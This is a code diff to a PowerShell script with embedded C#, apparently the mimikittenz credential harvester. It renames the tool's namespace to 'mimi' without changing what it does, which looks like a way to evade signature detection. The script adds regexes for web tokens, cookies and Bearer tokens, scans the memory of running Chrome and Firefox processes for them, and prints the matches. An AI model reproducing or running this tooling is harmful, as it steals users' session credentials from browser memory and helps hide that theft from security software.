@@ -23,7 +23,7 @@ using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.IO;
 
-namespace mimikittenz
+namespace mimi
 {
     public class MemProcInspector
     {
@@ -432,18 +432,18 @@ $inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Loc
 
 Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
-[mimikittenz.MemProcInspector]::regexes.Clear()
+[mimi.MemProcInspector]::regexes.Clear()
 #Internet Banking
 #Err... Taken out for good measure 
 
 #Web E-mail 
 
-    [mimikittenz.MemProcInspector]::AddRegex("token", "web&token=[A-Z0-9]{6,6}")
-    [mimikittenz.MemProcInspector]::AddRegex("cookie", "token%22%3A%22[A-Z0-9]{6,6}")
-    [mimikittenz.MemProcInspector]::AddRegex("bearer", "Bearer [A-Z0-9]{6,6}")
+    [mimi.MemProcInspector]::AddRegex("token", "web&token=[A-Z0-9]{6,6}")
+    [mimi.MemProcInspector]::AddRegex("cookie", "token%22%3A%22[A-Z0-9]{6,6}")
+    [mimi.MemProcInspector]::AddRegex("bearer", "Bearer [A-Z0-9]{6,6}")
 
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("chrome","firefox")
+$matchesFound=[mimi.MemProcInspector]::InspectManyProcs("chrome","firefox")
 
 write-output $matchesFound
 }
